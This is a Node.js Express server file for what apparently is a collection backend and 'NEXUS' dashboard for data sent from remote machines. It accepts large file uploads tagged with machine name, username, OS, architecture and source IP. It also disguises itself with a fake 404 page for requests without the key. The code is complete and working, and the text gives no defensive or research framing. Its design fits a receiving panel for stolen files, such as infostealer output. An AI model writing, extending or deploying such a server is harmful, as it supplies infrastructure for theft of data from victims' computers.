const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = process.env.API_KEY || "changeme";
const UPLOAD_DIR = path.join(__dirname, "uploads");
const META_FILE = path.join(__dirname, "metadata.json");

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
if (!fs.existsSync(META_FILE)) fs.writeFileSync(META_FILE, "[]");

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const id = crypto.randomBytes(6).toString("hex");
    const ts = Date.now();
    cb(null, `${ts}_${id}.dat`);
  },
});
const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });

function checkKey(req, res, next) {
  const key = req.query.key || req.headers["x-api-key"] || (req.headers.authorization || "").replace("Bearer ", "");
  if (key !== API_KEY) return res.status(401).send(page404());
  next();
}

function loadMeta() {
  try { return JSON.parse(fs.readFileSync(META_FILE, "utf8")); }
  catch { return []; }
}

function saveMeta(data) {
  fs.writeFileSync(META_FILE, JSON.stringify(data, null, 2));
}

function fmtSize(bytes) {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + " MB";
  return (bytes / 1073741824).toFixed(2) + " GB";
}

function timeAgo(iso) {
  const ms = Date.now() - new Date(iso).getTime();
  const s = Math.floor(ms / 1000);
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  const d = Math.floor(h / 24);
  return d + "d ago";
}

function fmtTime(iso) {
  const d = new Date(iso);
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

function esc(s) {
  if (!s) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function osIcon(os) {
  if (!os) return "❓";
  const l = os.toLowerCase();
  if (l.includes("windows 10")) return "W10";
  if (l.includes("windows 11")) return "W11";
  if (l.includes("windows")) return "WIN";
  if (l.includes("linux")) return "LNX";
  if (l.includes("mac") || l.includes("darwin")) return "MAC";
  return "SYS";
}

function page404() {
  return `<!DOCTYPE html><html><head><title>404</title></head><body style="background:#000;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>404</h1></body></html>`;
}

app.post("/api/v1/sync", checkKey, upload.single("file"), (req, res) => {
  if (!req.file) return res.status(400).json({ e: 1 });
  const meta = loadMeta();
  meta.unshift({
    id: crypto.randomBytes(4).toString("hex"),
    f: req.file.filename,
    s: req.file.size,
    t: new Date().toISOString(),
    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress || "",
    m: req.query.m || "",
    u: req.query.u || "",
    o: req.query.o || "",
    a: req.query.a || "",
  });
  saveMeta(meta);
  res.json({ e: 0 });
});

app.get("/", checkKey, (req, res) => {
  const meta = loadMeta();
  const totalSize = meta.reduce((s, e) => s + (e.s || 0), 0);
  const k = encodeURIComponent(req.query.key);
  res.send(renderPage(meta, totalSize, k));
});

app.get("/dl/:f", checkKey, (req, res) => {
  const fp = path.join(UPLOAD_DIR, path.basename(req.params.f));
  if (!fs.existsSync(fp)) return res.status(404).send(page404());
  res.download(fp);
});

app.post("/rm/:f", checkKey, (req, res) => {
  const fname = path.basename(req.params.f);
  const fp = path.join(UPLOAD_DIR, fname);
  if (fs.existsSync(fp)) fs.unlinkSync(fp);
  let meta = loadMeta();
  meta = meta.filter((e) => e.f !== fname);
  saveMeta(meta);
  res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
});

function renderPage(entries, totalSize, k) {
  const uniqueIps = new Set(entries.map(e => e.ip)).size;
  const rows = entries.map((e, i) => {
    const osTag = osIcon(e.o);
    const isWin = (e.o || "").toLowerCase().includes("windows");
    return `<tr>
      <td class="mono dim">${esc(e.id)}</td>
      <td><span class="tag ${isWin ? "tag-g" : "tag-b"}">${osTag}</span></td>
      <td class="mono">${esc(e.m)}${e.u ? "<span class='dim'>\\\\"+esc(e.u)+"</span>" : ""}</td>
      <td class="mono dim">${esc(e.a)}</td>
      <td class="mono dim">${esc(e.ip)}</td>
      <td class="mono">${fmtSize(e.s || 0)}</td>
      <td><span class="dim">${fmtTime(e.t)}</span><br><span class="accent">${timeAgo(e.t)}</span></td>
      <td class="actions">
        <a class="btn btn-p" href="/dl/${encodeURIComponent(e.f)}?key=${k}">&#8615;</a>
        <form method="POST" action="/rm/${encodeURIComponent(e.f)}?key=${k}" style="display:inline" onsubmit="return confirm('remove entry?')">
          <button class="btn btn-d" type="submit">&#10005;</button>
        </form>
      </td>
    </tr>`;
  }).join("");

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dashboard</title>
<style>
:root{--bg:#06060f;--card:#0c0c1e;--border:#14142e;--text:#8888aa;--dim:#44446a;--accent:#c084fc;--green:#4ade80;--red:#f87171;--blue:#60a5fa;--mono:'SF Mono','Cascadia Code','Fira Code','Consolas',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:12px;min-height:100vh}
.shell{max-width:1440px;margin:0 auto;padding:24px 20px}
.top{display:flex;align-items:center;justify-content:space-between;padding-bottom:20px;border-bottom:1px solid var(--border)}
.logo{display:flex;align-items:center;gap:10px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 2.5s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
.logo h1{font-size:14px;color:var(--accent);letter-spacing:3px;font-weight:600}
.top-r{font-size:10px;color:var(--dim)}
.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:20px 0}
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px 20px;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),transparent)}
.card .k{font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin-bottom:6px}
.card .v{font-size:24px;color:#eee;font-weight:700}
.card .v.sm{font-size:13px}
table{width:100%;border-collapse:separate;border-spacing:0;margin-top:16px}
thead th{background:var(--card);color:var(--dim);font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:10px 12px;text-align:left;border-bottom:1px solid var(--border)}
thead th:first-child{border-radius:8px 0 0 0}
thead th:last-child{border-radius:0 8px 0 0}
tbody td{padding:10px 12px;border-bottom:1px solid #0a0a18;vertical-align:middle}
tbody tr{transition:background .15s}
tbody tr:hover{background:#0d0d22}
.mono{font-family:var(--mono)}
.dim{color:var(--dim)}
.accent{color:var(--accent);font-size:10px}
.tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;letter-spacing:1px}
.tag-g{background:#0d2818;color:var(--green)}
.tag-b{background:#1a1040;color:var(--accent)}
.actions{white-space:nowrap}
.btn{display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:6px;border:1px solid var(--border);background:var(--card);color:var(--text);font-size:14px;cursor:pointer;text-decoration:none;transition:all .15s;font-family:var(--mono)}
.btn-p:hover{background:#1a1a3a;color:var(--blue);border-color:var(--blue)}
.btn-d:hover{background:#1a0a0a;color:var(--red);border-color:var(--red)}
.empty{text-align:center;padding:80px 20px;color:var(--dim)}
.empty .icon{font-size:36px;margin-bottom:12px;opacity:.3}
.empty p{font-size:13px}
.foot{text-align:center;padding:30px;color:#1a1a2e;font-size:10px}
@media(max-width:768px){.cards{grid-template-columns:repeat(2,1fr)}table{font-size:11px}td,th{padding:6px 8px}.shell{padding:12px 10px}}
@media(max-width:480px){.cards{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="shell">
  <div class="top">
    <div class="logo"><div class="dot"></div><h1>NEXUS</h1></div>
    <div class="top-r">live &middot; auto-refresh 30s</div>
  </div>
  <div class="cards">
    <div class="card"><div class="k">entries</div><div class="v">${entries.length}</div></div>
    <div class="card"><div class="k">volume</div><div class="v">${fmtSize(totalSize)}</div></div>
    <div class="card"><div class="k">sources</div><div class="v">${uniqueIps}</div></div>
    <div class="card"><div class="k">latest</div><div class="v sm">${entries.length ? timeAgo(entries[0].t) : "—"}</div></div>
  </div>
  ${entries.length ? `<table>
    <thead><tr><th>id</th><th>sys</th><th>host</th><th>arch</th><th>origin</th><th>size</th><th>received</th><th></th></tr></thead>
    <tbody>${rows}</tbody>
  </table>` : '<div class="empty"><div class="icon">&#9673;</div><p>no entries</p></div>'}
  <div class="foot">nexus v2</div>
</div>
<script>setTimeout(()=>location.reload(),30000)</script>
</body>
</html>`;
}

app.listen(PORT, () => {
  console.log(`[+] running on ${PORT}`);
});
